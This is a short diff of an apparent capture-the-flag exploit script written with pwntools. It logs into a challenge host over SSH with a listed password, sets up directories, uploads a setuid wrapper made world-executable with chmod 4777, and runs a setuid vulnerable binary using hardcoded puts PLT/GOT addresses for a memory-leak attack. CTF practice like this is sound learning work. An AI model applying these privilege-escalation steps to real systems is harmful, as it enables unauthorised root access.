@@ -2,10 +2,10 @@ from pwn import *
 context.arch = "i386"
  
 s = ssh(user="pwn0", host="pwn.hackaflag.com.br", port=22, password="pwn0ownar")
-s.process(["/bin/rm", "-rf","/dev/shm/dummy"])
-s.process(["/bin/rm", "-rf","/dev/shm/iconv"])
-s.process(["/bin/mkdir", "/dev/shm/dummy"])
-s.process(["/bin/mkdir", "/dev/shm/iconv"])
+s.process(["/bin/rm", "-rf","/tmp/dummy"])
+s.process(["/bin/rm", "-rf","/tmp/iconv"])
+s.process(["/bin/mkdir", "/tmp/dummy"])
+s.process(["/bin/mkdir", "/tmp/iconv"])
  
 setuid_wrapper = ("""
 #include <stdio.h>
@@ -24,10 +24,10 @@ f.write(setuid_wrapper)
 f.close()
 os.system("gcc f.c -o skeleton -m32")
 os.system("mv skeleton skeleton.c")
-s.put("./skeleton.c", remote="/dev/shm/iconv/skeleton.c")
-s.process(["/bin/chmod","4777","/dev/shm/iconv/skeleton.c"])
+s.put("./skeleton.c", remote="/tmp/iconv/skeleton.c")
+s.process(["/bin/chmod","4777","/tmp/iconv/skeleton.c"])
  
-p = s.process(executable="/home/pwn0/simple_vuln", cwd="/dev/shm/dummy", setuid=True, aslr=True)
+p = s.process(executable="/home/pwn0/simple_vuln", cwd="/tmp/dummy", setuid=True, aslr=True)
 puts_plt = 0x8048440
 puts_got = 0x804a01c
 main = 0x8048681
